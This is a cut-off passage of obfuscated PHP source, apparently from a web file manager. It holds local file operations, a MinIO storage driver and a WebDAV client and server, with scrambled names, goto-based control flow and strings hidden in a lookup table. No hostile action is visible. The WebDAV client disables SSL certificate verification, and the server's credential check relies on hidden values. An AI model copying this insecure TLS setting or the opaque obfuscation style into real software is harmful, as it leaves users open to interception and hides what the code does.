public function __construct() { parent::__construct(); } public function getPath($f¾¯¤…ª¬Ë) { if (substr($f¾¯¤…ª¬Ë, 0, 2) == $_SERVER[åÌÛ»ô¢‚ö™][1181]) { $f¾¯¤…ª¬Ë = BASIC_PATH . substr($f¾¯¤…ª¬Ë, 2); } return $f¾¯¤…ª¬Ë; } public function iconvApp($CÑ‡«àÈÏÊ) { $e¯•½ÇÌÊö =& $_SERVER[åÌÛ»ô¢‚ö™]; global $config; return $this->iconvTo($CÑ‡«àÈÏÊ, $config[$e¯•½ÇÌÊö[1179]], $config[$e¯•½ÇÌÊö[1178]]); } public function iconvSystem($F¨öÅÍ›) { $a¿¶­©¼Í =& $_SERVER[åÌÛ»ô¢‚ö™]; global $config; return $this->iconvTo($F¨öÅÍ›, $config[$a¿¶­©¼Í[1178]], $config[$a¿¶­©¼Í[1179]]); } public function getPathOuter($Fœâ½ŠèÎ) { goto CŒ«÷Ö×Š; eó—‘®ê®¬: if (substr($a³ƒ‡Ñá¤˜, 0, 2) == $EŠä¡õê[1181]) { $a³ƒ‡Ñá¤˜ = BASIC_PATH . substr($a³ƒ‡Ñá¤˜, 2); } if (substr($Fœâ½ŠèÎ, 0, 2) == $EŠä¡õê[1181]) { $Fœâ½ŠèÎ = BASIC_PATH . substr($Fœâ½ŠèÎ, 2); } $a³ƒ‡Ñá¤˜ = KodIO::clear($a³ƒ‡Ñá¤˜); goto bŒ¥‡ßìóå; CŒ«÷Ö×Š: $EŠä¡õê =& $_SERVER[åÌÛ»ô¢‚ö™]; $a³ƒ‡Ñá¤˜ = $this->iconvApp($this->pathBase); $Fœâ½ŠèÎ = $this->iconvApp($Fœâ½ŠèÎ); goto eó—‘®ê®¬; aø›áŒš¯¾: return $this->pathDriver . $EŠä¡õê[8] . ltrim($Fœâ½ŠèÎ, $EŠä¡õê[8]); goto E‹‡ø‹’Ä´; bŒ¥‡ßìóå: $Fœâ½ŠèÎ = KodIO::clear($Fœâ½ŠèÎ); $Fœâ½ŠèÎ = substr($Fœâ½ŠèÎ, strlen($a³ƒ‡Ñá¤˜)); if (empty($this->pathDriver)) { return $Fœâ½ŠèÎ; } goto aø›áŒš¯¾; E‹‡ø‹’Ä´: } public function mkfile($f›¬†ÆÅ”¼, $c·¹‚Òİáƒ = '', $Aœè‚º¢ÄÑ = REPEAT_RENAME) { $f›¬†ÆÅ”¼ = $this->iconvSystem($f›¬†ÆÅ”¼); @touch($f›¬†ÆÅ”¼); if ($c·¹‚Òİáƒ) { file_put_contents($f›¬†ÆÅ”¼, $c·¹‚Òİáƒ); } return is_file($f›¬†ÆÅ”¼) ? $this->getPathOuter($f›¬†ÆÅ”¼) : !1; } public function mkdir($AçÁùîÌ¢, $c‘ø“Ü‹²É = REPEAT_SKIP) { $AçÁùîÌ¢ = $this->iconvSystem($AçÁùîÌ¢); if (is_dir($AçÁùîÌ¢)) { return $this->getPathOuter($AçÁùîÌ¢); } @mkdir($AçÁùîÌ¢, 511, !0); return is_dir($AçÁùîÌ¢) ? $this->getPathOuter($AçÁùîÌ¢) : !1; } public function copyFile($C¡­İ¢ÄåØ, $AÀåÙµÈˆ) { $this->mkdir($this->pathFather($AÀåÙµÈˆ)); $C¡­İ¢ÄåØ = $this->iconvSystem($C¡­İ¢ÄåØ); $AÀåÙµÈˆ = $this->iconvSystem($AÀåÙµÈˆ); $Fİ÷©¦ø™¨ = copy_64($C¡­İ¢ÄåØ, $AÀåÙµÈˆ); return $Fİ÷©¦ø™¨ ? $this->getPathOuter($AÀåÙµÈˆ) : !1; } public function moveFile($e‘Ø“ä‚Î¤, $d»Ñ¿õ) { $this->mkdir($this->pathFather($d»Ñ¿õ)); $e‘Ø“ä‚Î¤ = $this->iconvSystem($e‘Ø“ä‚Î¤); $d»Ñ¿õ = $this->iconvSystem($d»Ñ¿õ); $e§¼Ñ±î° = intval(@rename($e‘Ø“ä‚Î¤, $d»Ñ¿õ)); if (!$e§¼Ñ±î°) { if ($e§¼Ñ±î° = intval(@copy_64($e‘Ø“ä‚Î¤, $d»Ñ¿õ))) { @unlink($e‘Ø“ä‚Î¤); } } return $e§¼Ñ±î° ? $this->getPathOuter($d»Ñ¿õ) : !1; } public function delFile($Dè‘±Öƒ’) { $Dè‘±Öƒ’ = $this->iconvSystem($Dè‘±Öƒ’); if (!@unlink($Dè‘±Öƒ’)) { @chmod($Dè‘±Öƒ’, 511); if (!@unlink($Dè‘±Öƒ’)) { return !1; } } else { return !0; } } public function delFolder($Cµè¡å›Õ) { goto d‡ö‡‡ğ¯º; d‡ö‡‡ğ¯º: $e¼øéêŒ¡ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Cµè¡å›Õ = $this->iconvSystem($Cµè¡å›Õ); if (!is_dir($Cµè¡å›Õ)) { return !0; } goto B—éÊ“Ä¡¢; cØÀñƒÚ‰Ë: return rmdir($Cµè¡å›Õ); goto a‹œçßœŠ; B—éÊ“Ä¡¢: if (!($dŞÁ³Œ™ñà = opendir($Cµè¡å›Õ))) { return !1; } while (($D™‚ÔÒñÌŞ = readdir($dŞÁ³Œ™ñà)) !== !1) { if ($D™‚ÔÒñÌŞ == $e¼øéêŒ¡[91] || $D™‚ÔÒñÌŞ == $e¼øéêŒ¡[1191]) { continue; } $f”Ÿ¹äà¬Ã = $Cµè¡å›Õ . $e¼øéêŒ¡[8] . $D™‚ÔÒñÌŞ; if (is_file($f”Ÿ¹äà¬Ã) || is_link($f”Ÿ¹äà¬Ã)) { if (!unlink($f”Ÿ¹äà¬Ã)) { chmod($f”Ÿ¹äà¬Ã, 511); if (!unlink($f”Ÿ¹äà¬Ã)) { return !1; } } } else { if (is_dir($f”Ÿ¹äà¬Ã)) { chmod($f”Ÿ¹äà¬Ã, 511); $f”Ÿ¹äà¬Ã = $this->iconvApp($f”Ÿ¹äà¬Ã); if (!$this->delFolder($f”Ÿ¹äà¬Ã)) { return !1; } } } } closedir($dŞÁ³Œ™ñà); goto cØÀñƒÚ‰Ë; a‹œçßœŠ: } public function rename($F£ïÌ„æÖ, $CÎµ‚Äø·›) { goto då……Ú; då……Ú: $d‹‘ÏßŸ¯ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fÇœŠŸáš» = $this->fileNameAuto($this->pathFather($F£ïÌ„æÖ), $CÎµ‚Äø·›); $fÇœŠŸáš» = $this->iconvSystem($fÇœŠŸáš»); goto Eï‡î…¡Á; Eï‡î…¡Á: $F£ïÌ„æÖ = $this->iconvSystem($F£ïÌ„æÖ); $c´§›Ï›º› = $this->pathFather($F£ïÌ„æÖ); $Câ°©Ãà²» = rtrim($c´§›Ï›º›, $d‹‘ÏßŸ¯[8]) . $d‹‘ÏßŸ¯[8] . $fÇœŠŸáš»; goto C¸ˆÛò¿¾•; C¸ˆÛò¿¾•: $bŞ…ÑŠ‡ó = @rename($F£ïÌ„æÖ, $Câ°©Ãà²»); $Câ°©Ãà²» = $this->iconvApp($Câ°©Ãà²»); return $bŞ…ÑŠ‡ó ? $this->getPathOuter($Câ°©Ãà²») : !1; goto e‡õ×ÈÜ´™; e‡õ×ÈÜ´™: } public function size($cÒåÓä“†) { $cÒåÓä“† = $this->iconvSystem($cÒåÓä“†); return filesize_64($cÒåÓä“†); } public function info($EÖ¿Ù´¯‡) { $EÖ¿Ù´¯‡ = $this->iconvSystem($EÖ¿Ù´¯‡); if ($this->isFolder($EÖ¿Ù´¯‡)) { return $this->folderInfo($EÖ¿Ù´¯‡); } else { if ($this->isFile($EÖ¿Ù´¯‡)) { return $this->fileInfo($EÖ¿Ù´¯‡); } } return !1; } protected function infoChildren($cË­¢Ôãôö, &$bß©æœÓñÌ, $DÑ¦ÌŠ¬¾³ = true) { goto Aæì­¹Çğ; E‚½ØïÆ‹¢: if ($DÑ¦ÌŠ¬¾³) { $cË­¢Ôãôö = $this->iconvSystem($cË­¢Ôãôö); } if (!($c²ò™ËÊñ¯ = @opendir($cË­¢Ôãôö))) { return; } while (($fó¦Ú œÓÌ = readdir($c²ò™ËÊñ¯)) !== !1) { if ($fó¦Ú œÓÌ == $eŒÔĞÎî÷ñ[91] || $fó¦Ú œÓÌ == $eŒÔĞÎî÷ñ[1191]) { continue; } $cÀœçæô¥« = $cË­¢Ôãôö . $fó¦Ú œÓÌ; if (is_file($cÀœçæô¥«) || is_link($cÀœçæô¥«)) { $bß©æœÓñÌ[$eŒÔĞÎî÷ñ[78]]++; $bß©æœÓñÌ[$eŒÔĞÎî÷ñ[77]] += filesize_64($cÀœçæô¥«); } else { if (is_dir($cÀœçæô¥«)) { $bß©æœÓñÌ[$eŒÔĞÎî÷ñ[79]]++; $this->infoChildren($cÀœçæô¥«, $bß©æœÓñÌ, !1); } } } goto AøõÊ½– «; AøõÊ½– «: closedir($c²ò™ËÊñ¯); goto có®£Œòá¶; Aæì­¹Çğ: $eŒÔĞÎî÷ñ =& $_SERVER[åÌÛ»ô¢‚ö™]; check_abort(); $cË­¢Ôãôö = rtrim($cË­¢Ôãôö, $eŒÔĞÎî÷ñ[8]) . $eŒÔĞÎî÷ñ[8]; goto E‚½ØïÆ‹¢; có®£Œòá¶: } private function folderInfo($e¹³áà¬î£, $fíÍäÏîñ = false) { $dÛ÷§´×º =& $_SERVER[åÌÛ»ô¢‚ö™]; $e¹³áà¬î£ = rtrim($e¹³áà¬î£, $dÛ÷§´×º[8]) . $dÛ÷§´×º[8]; $Fß·”ŒÃæÊ = $this->iconvApp($this->pathThis($e¹³áà¬î£)); if ($fíÍäÏîñ) { return array($dÛ÷§´×º[28] => $Fß·”ŒÃæÊ, $dÛ÷§´×º[75] => $this->getPathOuter($e¹³áà¬î£), $dÛ÷§´×º[29] => $dÛ÷§´×º[76]); } $bˆƒ‘½ïÒõ = array($dÛ÷§´×º[28] => $Fß·”ŒÃæÊ, $dÛ÷§´×º[75] => $this->getPathOuter($e¹³áà¬î£), $dÛ÷§´×º[29] => $dÛ÷§´×º[76], $dÛ÷§´×º[200] => @filectime($e¹³áà¬î£), $dÛ÷§´×º[107] => @filemtime($e¹³áà¬î£), $dÛ÷§´×º[1193] => @fileatime($e¹³áà¬î£), $dÛ÷§´×º[1188] => is_readable($e¹³áà¬î£), $dÛ÷§´×º[1189] => is_writable($e¹³áà¬î£), $dÛ÷§´×º[1194] => get_mode($e¹³áà¬î£)); return $bˆƒ‘½ïÒõ; } private function fileInfo($f£÷ğÑ‘’, $eÀâÍã§à = false) { $Bóºé—À‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; $DëĞ¿åŠØë = $this->iconvApp($this->pathThis($f£÷ğÑ‘’)); if ($eÀâÍã§à) { return array($Bóºé—À‰[28] => $DëĞ¿åŠØë, $Bóºé—À‰[75] => $this->getPathOuter($f£÷ğÑ‘’), $Bóºé—À‰[29] => $Bóºé—À‰[171], $Bóºé—À‰[77] => $this->size($f£÷ğÑ‘’), $Bóºé—À‰[165] => $this->ext($DëĞ¿åŠØë)); } $a›ßÌß—Ö× = array($Bóºé—À‰[28] => $DëĞ¿åŠØë, $Bóºé—À‰[75] => $this->getPathOuter($f£÷ğÑ‘’), $Bóºé—À‰[29] => $Bóºé—À‰[171], $Bóºé—À‰[200] => @filectime($f£÷ğÑ‘’), $Bóºé—À‰[107] => @filemtime($f£÷ğÑ‘’), $Bóºé—À‰[1193] => @fileatime($f£÷ğÑ‘’), $Bóºé—À‰[77] => $this->size($f£÷ğÑ‘’), $Bóºé—À‰[165] => $this->ext($DëĞ¿åŠØë), $Bóºé—À‰[1188] => is_readable($f£÷ğÑ‘’), $Bóºé—À‰[1189] => is_writable($f£÷ğÑ‘’), $Bóºé—À‰[1194] => get_mode($f£÷ğÑ‘’)); return $a›ßÌß—Ö×; } public function exist($F§«Ÿ›Ûìº) { $F§«Ÿ›Ûìº = $this->iconvSystem($F§«Ÿ›Ûìº); return @file_exists($F§«Ÿ›Ûìº); } public function isFile($cŞÂ„Ÿ¾Äå) { $cŞÂ„Ÿ¾Äå = $this->iconvSystem($cŞÂ„Ÿ¾Äå); return @is_file($cŞÂ„Ÿ¾Äå); } public function isFolder($b‹öÇ„Ğ) { $b‹öÇ„Ğ = $this->iconvSystem($b‹öÇ„Ğ); return @is_dir($b‹öÇ„Ğ); } public function listPath($e²•®Æ›âÆ, $Cè‘®îÜ’ = false) { goto eâ›Ñä²“…; dÉ¶©¢à‰: $f´²ä¶Äğª = array($Fš´ùîší‚[74] => array(), $Fš´ùîší‚[73] => array()); if (!($b¶Ñ’ËÅğƒ = @opendir($e²•®Æ›âÆ))) { return $f´²ä¶Äğª; } while (($e¦ª„¦¥… = readdir($b¶Ñ’ËÅğƒ)) !== !1) { if ($e¦ª„¦¥… == $Fš´ùîší‚[91] || $e¦ª„¦¥… == $Fš´ùîší‚[1191]) { continue; } $aÊ–³ŒÈ = $e²•®Æ›âÆ . $e¦ª„¦¥…; if (is_file($aÊ–³ŒÈ)) { $f´²ä¶Äğª[$Fš´ùîší‚[73]][] = $this->fileInfo($aÊ–³ŒÈ, $Cè‘®îÜ’); } else { $f´²ä¶Äğª[$Fš´ùîší‚[74]][] = $this->folderInfo($aÊ–³ŒÈ, $Cè‘®îÜ’); } } goto Có©† Œˆñ; Có©† Œˆñ: closedir($b¶Ñ’ËÅğƒ); return $f´²ä¶Äğª; goto D¸›Øˆ¦Ó‰; eâ›Ñä²“…: $Fš´ùîší‚ =& $_SERVER[åÌÛ»ô¢‚ö™]; $e²•®Æ›âÆ = $this->iconvSystem($e²•®Æ›âÆ); $e²•®Æ›âÆ = rtrim($e²•®Æ›âÆ, $Fš´ùîší‚[8]) . $Fš´ùîší‚[8]; goto dÉ¶©¢à‰; D¸›Øˆ¦Ó‰: } public function listAll($c—Èï¾–ˆ, &$D¢è£ŠöŸ = array()) { goto eáÚ¼¤ÄÔï; eÚ¢²©ÒŠ„: return $D¢è£ŠöŸ; goto Bö¬Ôˆ´Ó; eáÚ¼¤ÄÔï: $açå–‰¡ô =& $_SERVER[åÌÛ»ô¢‚ö™]; $c—Èï¾–ˆ = $this->iconvSystem($c—Èï¾–ˆ); $c—Èï¾–ˆ = rtrim($c—Èï¾–ˆ, $açå–‰¡ô[8]) . $açå–‰¡ô[8]; goto fãÄö†ëî; fãÄö†ëî: if (!($F¾öÓ¯£Ñš = @opendir($c—Èï¾–ˆ))) { return $D¢è£ŠöŸ; } while (($E‘Ü‰ÓîÌ = readdir($F¾öÓ¯£Ñš)) !== !1) { if ($E‘Ü‰ÓîÌ == $açå–‰¡ô[91] || $E‘Ü‰ÓîÌ == $açå–‰¡ô[1191]) { continue; } $fø¬×ÍÑ‹Ç = $c—Èï¾–ˆ . $E‘Ü‰ÓîÌ; if (is_dir($fø¬×ÍÑ‹Ç) && !is_link($fø¬×ÍÑ‹Ç)) { $D¢è£ŠöŸ[] = array($açå–‰¡ô[75] => $fø¬×ÍÑ‹Ç . $açå–‰¡ô[8], $açå–‰¡ô[76] => 1, $açå–‰¡ô[107] => @filemtime($fø¬×ÍÑ‹Ç), $açå–‰¡ô[77] => 0); $this->listAll($fø¬×ÍÑ‹Ç, $D¢è£ŠöŸ); } else { $D¢è£ŠöŸ[] = array($açå–‰¡ô[75] => $fø¬×ÍÑ‹Ç, $açå–‰¡ô[76] => 0, $açå–‰¡ô[107] => @filemtime($fø¬×ÍÑ‹Ç), $açå–‰¡ô[77] => $this->size($fø¬×ÍÑ‹Ç)); } } closedir($F¾öÓ¯£Ñš); goto eÚ¢²©ÒŠ„; Bö¬Ôˆ´Ó: } public function has($fŒªâÑ—¥î, $eóñ‘ì‹èã = false, $A›¾Î®¸ = true) { goto B¾ß”£¡¯§; FÜô”¼àØ”: if (!($eˆ†‘·Å™÷ = @opendir($fŒªâÑ—¥î))) { return !1; } $CŒ‰˜ÛëÇ™ = 0; $e ŒÑ±Èò» = 0; goto A¼ÌÒâ™„é; A¼ÌÒâ™„é: $FñäÛ²¾–‡ = 0; while (($Dº¡Ù†»‡À = readdir($eˆ†‘·Å™÷)) !== !1) { if ($Dº¡Ù†»‡À == $eÄ¶¬¶ë¤»[91] || $Dº¡Ù†»‡À == $eÄ¶¬¶ë¤»[1191]) { continue; } $CÇÖæá¹øó = $fŒªâÑ—¥î . $Dº¡Ù†»‡À; if ($eóñ‘ì‹èã) { $FñäÛ²¾–‡++; if (@is_file($CÇÖæá¹øó)) { $CŒ‰˜ÛëÇ™++; } else { $e ŒÑ±Èò»++; } if ($FñäÛ²¾–‡ > 10000) { break; } continue; } if ($A›¾Î®¸) { if (@is_file($CÇÖæá¹øó)) { return !0; } } else { if (@is_dir($CÇÖæá¹øó . $eÄ¶¬¶ë¤»[8])) { return !0; } } } closedir($eˆ†‘·Å™÷); goto AŞ§¸×ğÜÎ; AŞ§¸×ğÜÎ: if ($eóñ‘ì‹èã) { return array($eÄ¶¬¶ë¤»[209] => $CŒ‰˜ÛëÇ™, $eÄ¶¬¶ë¤»[210] => $e ŒÑ±Èò»); } return !1; goto DÎ¥‹îÖ±; B¾ß”£¡¯§: $eÄ¶¬¶ë¤» =& $_SERVER[åÌÛ»ô¢‚ö™]; $fŒªâÑ—¥î = $this->iconvSystem($fŒªâÑ—¥î); $fŒªâÑ—¥î = rtrim($fŒªâÑ—¥î, $eÄ¶¬¶ë¤»[8]) . $eÄ¶¬¶ë¤»[8]; goto FÜô”¼àØ”; DÎ¥‹îÖ±: } public function hashSimple($b›òöæİ) { goto D¼ê¾ê†ò; eñßÈô”ÜÓ: fseek_64($BÆ‹¬ÓÉŠğ, $A‘ ­ß‡² - $C¹‘Û¶±à); $cˆ…ŞÖë¶ .= fread($BÆ‹¬ÓÉŠğ, $C¹‘Û¶±à); fclose($BÆ‹¬ÓÉŠğ); goto C’ğŠŸ¦»‘; D¼ê¾ê†ò: $CÌ•¸‘Å =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$b›òöæİ) { return md5($CÌ•¸‘Å[33]); } $b›òöæİ = $this->iconvSystem($b›òöæİ); goto A áêÂº£¹; A áêÂº£¹: $A‘ ­ß‡² = $this->size($b›òöæİ); $C¹‘Û¶±à = 200; $E¤Ó†«³ï† = 50; goto BØÇøŒ¸£à; C’ğŠŸ¦»‘: return md5($cˆ…ŞÖë¶) . $A‘ ­ß‡²; goto BîÆîƒé¸; C»¸ÃæŸÉö: $BÆ‹¬ÓÉŠğ = fopen($b›òöæİ, $CÌ•¸‘Å[1195]); if (!$BÆ‹¬ÓÉŠğ) { return $cˆ…ŞÖë¶; } for ($b‡œÑŒƒ© = 0; $b‡œÑŒƒ© < $E¤Ó†«³ï†; $b‡œÑŒƒ©++) { fseek_64($BÆ‹¬ÓÉŠğ, $f ¬¹Õ·é¿ * $b‡œÑŒƒ©); $cˆ…ŞÖë¶ .= fread($BÆ‹¬ÓÉŠğ, $C¹‘Û¶±à); } goto eñßÈô”ÜÓ; BØÇøŒ¸£à: if ($A‘ ­ß‡² <= $C¹‘Û¶±à * $E¤Ó†«³ï†) { return $this->hashMd5($b›òöæİ) . $A‘ ­ß‡²; } $cˆ…ŞÖë¶ = $CÌ•¸‘Å[33]; $f ¬¹Õ·é¿ = intval($A‘ ­ß‡² / $E¤Ó†«³ï†); goto C»¸ÃæŸÉö; BîÆîƒé¸: } public function getContent($bºå†Â°¨ô) { $bºå†Â°¨ô = $this->iconvSystem($bºå†Â°¨ô); return file_get_contents($bºå†Â°¨ô); } public function setContent($b£ãà™ á, $eò…³‡Œµ÷ = '') { $b£ãà™ á = $this->iconvSystem($b£ãà™ á); @file_put_contents($b£ãà™ á, $eò…³‡Œµ÷, LOCK_EX); clearstatcache(); return strlen($eò…³‡Œµ÷) == filesize_64($b£ãà™ á); } public function fileSubstr($bÍÌÅÅ¼±É, $Bâ§é ÂÓ = 0, $Fòãù—¥Í = false) { goto a×Ÿ¬Õ“­õ; Eãƒº—¨ùß: fseek_64($CÈéÛöˆ“, $Bâ§é ÂÓ); $B‚éÊ¢¢ò = fread($CÈéÛöˆ“, $Fòãù—¥Í); fclose($CÈéÛöˆ“); goto C¨‡Š–ìİ¸; C¨‡Š–ìİ¸: return $B‚éÊ¢¢ò; goto B¼ìñÍÁªá; C­ğ¹£ÖÃÂ: if ($Fòãù—¥Í <= 0) { return $bÍ‡œŸµ¡[33]; } $CÈéÛöˆ“ = fopen($bÍÌÅÅ¼±É, $bÍ‡œŸµ¡[1195]); if (!$CÈéÛöˆ“) { return !1; } goto Eãƒº—¨ùß; a×Ÿ¬Õ“­õ: $bÍ‡œŸµ¡ =& $_SERVER[åÌÛ»ô¢‚ö™]; $bÍÌÅÅ¼±É = $this->iconvSystem($bÍÌÅÅ¼±É); if ($Fòãù—¥Í === !1) { $Fòãù—¥Í = $this->size($bÍÌÅÅ¼±É); } goto C­ğ¹£ÖÃÂ; B¼ìñÍÁªá: } public function upload($C¡ï¹¦ˆò’, $Còâğ¶ö·, $AœÒÊËôÎ˜ = false, $bÜ“‰«œ´ = REPEAT_REPLACE) { $AÎé×³ß¯ = $this->copyFile($Còâğ¶ö·, $C¡ï¹¦ˆò’); return $AÎé×³ß¯ ? $this->getPathOuter($C¡ï¹¦ˆò’) : !1; } public function setModifyTime($DôóëÅİ›®, $CÉ¹ö¦‹— = '') { @touch($DôóëÅİ›®, intval($CÉ¹ö¦‹—)); } public function download($DÆ¶Ş‡¾©, $EëõÙ¤¿¬Œ) { return $this->iconvSystem($DÆ¶Ş‡¾©); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($BôĞÍİ®œ©) { parent::__construct($BôĞÍİ®œ©); $this->signatureVersion($_SERVER[åÌÛ»ô¢‚ö™][218]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto D¦¹¼ŒæèŒ; EÒòâÙÔˆ®: class HttpDavClient { public function __construct($c™‡ù®³, $d§œçØè™à, $dã¿Ö”Œ¾ä) { $this->header = array(); $this->userName = $d§œçØè™à; $this->userPassowrd = $dã¿Ö”Œ¾ä; } protected function makePath($F…¶²íÔ) { return $F…¶²íÔ; } protected function setHeader($a¶¶ò±š²Í, $AùÑ¢ëªœò = false) { if ($AùÑ¢ëªœò === !1) { $this->header[] = $a¶¶ò±š²Í; } else { $this->header[] = $a¶¶ò±š²Í . $_SERVER[åÌÛ»ô¢‚ö™][902] . $AùÑ¢ëªœò; } } public function move($BŸÓéµ¬¿¶, $Dµœ±·Øï®, $C·¦›êä§ø = '') { $FÍãŠ·Ôã³ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->setHeader($FÍãŠ·Ôã³[1800], $this->makePath($Dµœ±·Øï®)); $this->setHeader($FÍãŠ·Ôã³[1801], $FÍãŠ·Ôã³[1802]); if ($C·¦›êä§ø) { $this->setHeader($FÍãŠ·Ôã³[1803], $FÍãŠ·Ôã³[946] . $C·¦›êä§ø . $FÍãŠ·Ôã³[949]); } return $this->send($FÍãŠ·Ôã³[1804], $BŸÓéµ¬¿¶); } public function copy($bù„ìÔô°Û, $CöÙêÏö¡) { $D„Û‚‹Ò†Ä =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->setHeader($D„Û‚‹Ò†Ä[1800], $this->makePath($CöÙêÏö¡)); $this->setHeader($D„Û‚‹Ò†Ä[1801], $D„Û‚‹Ò†Ä[1802]); return $this->send($D„Û‚‹Ò†Ä[1805], $bù„ìÔô°Û); } public function mkcol($Eƒø½ø‡—Ÿ) { $c‹¢§³å¬Ü =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->setHeader($c‹¢§³å¬Ü[1801], $c‹¢§³å¬Ü[1802]); return $this->send($c‹¢§³å¬Ü[1806], $Eƒø½ø‡—Ÿ); } public function delete($B‹äŸ‘ÅŒë, $F¾•æ¦•‡„ = '') { $bæòæŒ­ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($F¾•æ¦•‡„) { $this->setHeader($bæòæŒ­[1803], $bæòæŒ­[946] . $F¾•æ¦•‡„ . $bæòæŒ­[949]); } return $this->send($bæòæŒ­[1277], $B‹äŸ‘ÅŒë); } public function propfind($aÈ“ª¿Üë ) { $Cè÷Ù›æõğ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->setHeader($Cè÷Ù›æõğ[1807], $Cè÷Ù›æõğ[83]); $this->setHeader($Cè÷Ù›æõğ[1808], $Cè÷Ù›æõğ[1809]); $b¢âè˜äò = $Cè÷Ù›æõğ[1810]; return $this->send($Cè÷Ù›æõğ[1811], $aÈ“ª¿Üë , $b¢âè˜äò); } public function options($BŞÕ”†›â²) { return $this->send($_SERVER[åÌÛ»ô¢‚ö™][1812], $BŞÕ”†›â²); } public function get($F™œ·——àÇ) { return $this->send($_SERVER[åÌÛ»ô¢‚ö™][234], $F™œ·——àÇ); } public function put($AØŠ¨¯±ì®, $dŠÓÙÕŸ°“, $c®˜×î§†ó = '') { $AĞ„‰á”Â£ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($c®˜×î§†ó) { $this->setHeader($AĞ„‰á”Â£[1803], $AĞ„‰á”Â£[946] . $c®˜×î§†ó . $AĞ„‰á”Â£[949]); } return $this->send($AĞ„‰á”Â£[232], $AØŠ¨¯±ì®, $dŠÓÙÕŸ°“); } protected function send($fÁ•ôÊ›Â, $eÁç”Í—óÉ, $c„Œ —ğÌ = false, $aô«™¦‰·¨ = false) { goto c¥’ËÏô‡½; cĞ·¸†Şà: curl_setopt($D™“ğ‰ÔÍå, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($D™“ğ‰ÔÍå, CURLOPT_SSL_VERIFYHOST, !1); $e¹×à¿±³å = curl_exec($D™“ğ‰ÔÍå); goto DˆöñŸØ‚Æ; D–ï¸±øÓ…: $D™“ğ‰ÔÍå = curl_init($eÁç”Í—óÉ); curl_setopt($D™“ğ‰ÔÍå, CURLOPT_CUSTOMREQUEST, $fÁ•ôÊ›Â); curl_setopt($D™“ğ‰ÔÍå, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto dŠŸë‡ğ½; c¥’ËÏô‡½: $E¶ó’¨Æ½” =& $_SERVER[åÌÛ»ô¢‚ö™]; $B¹Ş™´”Üƒ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($E¶ó’¨Æ½”[1813], $E¶ó’¨Æ½”[50]); goto eÃØ·Ãºªè; DˆöñŸØ‚Æ: $this->header = array(); return $e¹×à¿±³å; goto EğÜˆ®ï•™; dŠŸë‡ğ½: curl_setopt($D™“ğ‰ÔÍå, CURLOPT_HTTPHEADER, $this->header); curl_setopt($D™“ğ‰ÔÍå, CURLOPT_RETURNTRANSFER, !0); curl_setopt($D™“ğ‰ÔÍå, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto cĞ·¸†Şà; eÃØ·Ãºªè: $this->setHeader($B¹Ş™´”Üƒ); if ($c„Œ —ğÌ) { $c„Œ —ğÌ = $E¶ó’¨Æ½”[1814] . $c„Œ —ğÌ; } if (!request_url_safe($eÁç”Í—óÉ)) { return !1; } goto D–ï¸±øÓ…; EğÜˆ®ï•™: } } class HttpDavServer { public function __construct($cÓÔ¾˜ì¯Æ, $dÑÜ¬äİà¹) { $this->root = $cÓÔ¾˜ì¯Æ; $this->initPath($dÑÜ¬äİà¹); $this->start(); } public function initPath($C¬åÇ åŒ) { $fÍ•º·Ş =& $_SERVER[åÌÛ»ô¢‚ö™]; $b©ò•İŸä˜ = rtrim($_SERVER[$fÍ•º·Ş[1415]], $fÍ•º·Ş[8]) . $fÍ•º·Ş[8]; $this->urlBase = substr($b©ò•İŸä˜, 0, strpos($b©ò•İŸä˜, $C¬åÇ åŒ) + 1); $this->urlBase = rtrim($this->urlBase, $fÍ•º·Ş[8]) . $C¬åÇ åŒ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $dãŸÜœå =& $_SERVER[åÌÛ»ô¢‚ö™]; $DÄä¹–œ = HttpAuth::get(); if ($DÄä¹–œ[$dãŸÜœå[560]] == $dãŸÜœå[1815] && $DÄä¹–œ[$dãŸÜœå[919]] == $dãŸÜœå[1816]) { return !0; } HttpAuth::error(); } public function start() { goto a…¢‰Ÿ®‘Ü; DÈøµ±‡‘î: if (!method_exists($this, $a–¿¢«Ê¬)) { pr($a–¿¢«Ê¬ . $F…ŸíÑó¶[1817]); die; } $A“‹¤‘·¬» = array($F…ŸíÑó¶[1818], $F…ŸíÑó¶[1819]); if (!in_array($a–¿¢«Ê¬, $A“‹¤‘·¬») && !$this->pathExists($this->path)) { $fíö…„Û¢ = array($F…ŸíÑó¶[1059] => 404); } else { $fíö…„Û¢ = $this->{$a–¿¢«Ê¬}(); } goto CßÑ³Ç§ò„; CßÑ³Ç§ò„: if (!$fíö…„Û¢) { return; } self::response($fíö…„Û¢); goto b°ÃåÜ˜‘; a…¢‰Ÿ®‘Ü: $F…ŸíÑó¶ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->checkUser(); $a–¿¢«Ê¬ = $F…ŸíÑó¶[144] . HttpHeader::method(); goto DÈøµ±‡‘î; b°ÃåÜ˜‘: } public function pathGet($cæÚÊˆÒ· = false) { $A¹œ‰Êá–ƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $E§ÊÓ–ŞÌÀ = $cæÚÊˆÒ· ? $_SERVER[$A¹œ‰Êá–ƒ[1820]] : $_SERVER[$A¹œ‰Êá–ƒ[1415]]; $E§ÊÓ–ŞÌÀ = KodIO::clear(rawurldecode($E§ÊÓ–ŞÌÀ)); if (!strstr($E§ÊÓ–ŞÌÀ, KodIO::clear($this->urlBase))) { return !1; } return substr($E§ÊÓ–ŞÌÀ, strpos($E§ÊÓ–ŞÌÀ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($câåÛœÌçƒ) { return file_exists($câåÛœÌçƒ); } public function pathMkdir($F…áÄõ”‰õ) { return 